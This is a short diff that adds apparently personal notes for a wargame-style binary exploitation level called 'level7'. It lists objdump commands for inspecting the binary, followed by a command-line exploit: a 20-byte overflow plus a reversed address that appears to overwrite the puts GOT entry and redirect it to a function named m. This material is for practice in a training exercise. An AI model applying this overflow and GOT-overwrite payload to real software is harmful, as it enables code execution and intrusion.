@@ -1,0 +1,8 @@
+objdump -RTDxs -m i386 ./level7
+
+objdump -RTDxs -m i386 ./level7 | grep "<m>"
+objdump -RTDxs -m i386 ./level7 | grep puts
+
+./level7 $(python -c 'print "A"*4') $(python -c 'print "B"*4')
+
+./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
